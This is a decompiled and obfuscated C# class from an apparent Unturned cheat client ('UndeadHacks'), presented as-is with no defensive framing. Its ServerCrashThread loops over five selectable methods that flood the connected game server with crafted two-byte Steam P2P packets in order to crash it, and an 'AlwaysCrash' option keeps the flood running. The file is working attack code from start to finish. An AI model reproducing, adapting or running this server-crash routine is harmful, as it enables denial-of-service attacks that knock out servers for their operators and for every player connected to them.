using System;
using System.Threading;
using SDG.Unturned;
using Steamworks;

namespace UndeadHacks
{
	// Token: 0x02000096 RID: 150
	public static class ServerCrashThread
	{
		// Token: 0x06000248 RID: 584 RVA: 0x00015804 File Offset: 0x00013A04
		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected = (Provider.ClientDisconnected)Delegate.Combine(Provider.onClientDisconnected, new Provider.ClientDisconnected(delegate()
			{
				ServerCrashThread.ServerCrashEnabled = false;
			}));
			for (;;)
			{
				IL_24B:
				byte[] array = new byte[2];
				for (;;)
				{
					IL_239:
					array[0] = 1;
					byte[] array2 = new byte[2];
					array2[0] = 24;
					for (;;)
					{
						IL_22C:
						byte[] array3 = new byte[2];
						array3[0] = 2;
						for (;;)
						{
							IL_214:
							byte[] array4 = new byte[2];
							array4[0] = 20;
							(new byte[2])[0] = 21;
							for (;;)
							{
								IL_208:
								if (Provider.isConnected)
								{
									IL_12B:
									while (ServerCrashThread.ServerCrashEnabled)
									{
										for (;;)
										{
											IL_122:
											int scrashMethod = MiscOptions.SCrashMethod;
											for (;;)
											{
												IL_100:
												switch (scrashMethod)
												{
												case 1:
													goto IL_157;
												case 2:
													goto IL_183;
												case 3:
													goto IL_1A9;
												case 4:
													goto IL_1CF;
												case 5:
													goto IL_1F5;
												default:
												{
													uint num2;
													uint num = num2 * 3613050171u ^ 3368511548u;
													for (;;)
													{
														switch ((num2 = (num ^ 483568246u)) % 37u)
														{
														case 0u:
															goto IL_1B9;
														case 1u:
															goto IL_1CF;
														case 2u:
															goto IL_13E;
														case 3u:
															goto IL_214;
														case 4u:
															num = (num2 * 3001342373u ^ 2394501943u);
															continue;
														case 5u:
															goto IL_12B;
														case 6u:
															goto IL_22C;
														case 7u:
															goto IL_1FE;
														case 8u:
															goto IL_1B2;
														case 9u:
															goto IL_174;
														case 11u:
															goto IL_18C;
														case 12u:
															goto IL_1A9;
														case 14u:
															goto IL_1C0;
														case 15u:
															goto IL_183;
														case 16u:
														case 24u:
															goto IL_24B;
														case 18u:
															goto IL_157;
														case 19u:
															goto IL_1D8;
														case 20u:
															goto IL_193;
														case 22u:
															goto IL_148;
														case 23u:
															goto IL_122;
														case 27u:
															goto IL_100;
														case 28u:
															goto IL_163;
														case 29u:
															goto IL_1DF;
														case 30u:
															goto IL_19A;
														case 31u:
															goto IL_16A;
														case 32u:
															goto IL_1F5;
														case 33u:
															goto IL_1E6;
														case 34u:
															goto IL_137;
														case 36u:
															goto IL_239;
														}
														goto Block_2;
													}
													break;
												}
												}
											}
										}
										Block_2:
										goto IL_208;
										IL_13E:
										if (ServerCrashThread.AlwaysCrash)
										{
											goto IL_148;
										}
										goto IL_208;
										IL_137:
										if (!ServerCrashThread.ServerCrashEnabled)
										{
											goto IL_13E;
										}
										goto IL_148;
										IL_157:
										if (Provider.isConnected)
										{
											goto IL_137;
										}
										goto IL_208;
										IL_148:
										SteamNetworking.SendP2PPacket(Provider.server, array, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
										goto IL_157;
										IL_16A:
										if (ServerCrashThread.AlwaysCrash)
										{
											goto IL_174;
										}
										goto IL_208;
										IL_163:
										if (!ServerCrashThread.ServerCrashEnabled)
										{
											goto IL_16A;
										}
										goto IL_174;
										IL_183:
										if (Provider.isConnected)
										{
											goto IL_163;
										}
										goto IL_208;
										IL_174:
										SteamNetworking.SendP2PPacket(Provider.server, array2, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
										goto IL_183;
										IL_193:
										if (ServerCrashThread.AlwaysCrash)
										{
											goto IL_19A;
										}
										goto IL_208;
										IL_18C:
										if (!ServerCrashThread.ServerCrashEnabled)
										{
											goto IL_193;
										}
										goto IL_19A;
										IL_1A9:
										if (Provider.isConnected)
										{
											goto IL_18C;
										}
										goto IL_208;
										IL_19A:
										SteamNetworking.SendP2PPacket(Provider.server, array3, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
										goto IL_1A9;
										IL_1B9:
										if (ServerCrashThread.AlwaysCrash)
										{
											goto IL_1C0;
										}
										goto IL_208;
										IL_1B2:
										if (!ServerCrashThread.ServerCrashEnabled)
										{
											goto IL_1B9;
										}
										goto IL_1C0;
										IL_1CF:
										if (!Provider.isConnected)
										{
											goto IL_208;
										}
										goto IL_1B2;
										IL_1C0:
										SteamNetworking.SendP2PPacket(Provider.server, array4, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
										goto IL_1CF;
										IL_1DF:
										if (ServerCrashThread.AlwaysCrash)
										{
											goto IL_1E6;
										}
										goto IL_208;
										IL_1D8:
										if (!ServerCrashThread.ServerCrashEnabled)
										{
											goto IL_1DF;
										}
										goto IL_1E6;
										IL_1F5:
										if (!Provider.isConnected)
										{
											goto IL_208;
										}
										goto IL_1D8;
										IL_1E6:
										SteamNetworking.SendP2PPacket(Provider.server, array4, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
										goto IL_1F5;
									}
								}
								IL_1FE:
								Thread.Sleep(1000);
							}
						}
					}
				}
			}
		}

		// Token: 0x04000213 RID: 531
		public static bool ServerCrashEnabled;

		// Token: 0x04000214 RID: 532
		public static bool AlwaysCrash;
	}
}
